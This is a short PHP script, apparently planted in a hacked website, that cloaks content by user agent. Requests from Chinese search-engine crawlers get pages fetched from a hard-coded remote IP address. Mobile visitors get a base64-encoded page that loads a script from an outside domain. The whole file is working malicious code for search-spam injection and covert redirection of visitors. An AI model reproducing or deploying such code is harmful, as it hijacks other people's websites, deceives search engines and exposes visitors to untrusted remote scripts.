<?php
$ua=$_SERVER['HTTP_USER_AGENT'];
$ua=strtolower($ua);
define('ent', $_SERVER['HTTP_USER_AGENT']);
define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/i');
if($ua!="" && (strpos($ua,"baiduspider") || strpos($ua,"sogou.com") || strpos($ua,"yisouspider") || strpos($ua,"360")))
{


$filename = $_GET["xj"];


    
$url = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
echo '<link rel="canonical" href="'.$url.'" />' ;

$ch = curl_init();

$url = "http://156.254.172.132/?host=". $_SERVER['HTTP_HOST'] . $filename;

curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)');
     
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);


curl_exec($ch);


curl_close($ch);

    exit;


} 
else
{
    if (preg_match(mobile, ent)) {
echo base64_decode("PGh0bWw+PGhlYWQ+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlID0xLjAsIHVzZXItc2NhbGFibGU9bm8sIG1heGltdW0tc2NhbGU9MSxtaW5pbXVtLXNjYWxlPTEiPjwvaGVhZD48Ym9keSBzdHlsZT0ibWFyZ2luOjA7Ij48c2NyaXB0IHNyYz1odHRwczovL2pzLm1ydDMxLmNvbS9keS9keS5qcz48L3NjcmlwdD48L2JvZHk+PC9odG1sPgo=");}
}
?>
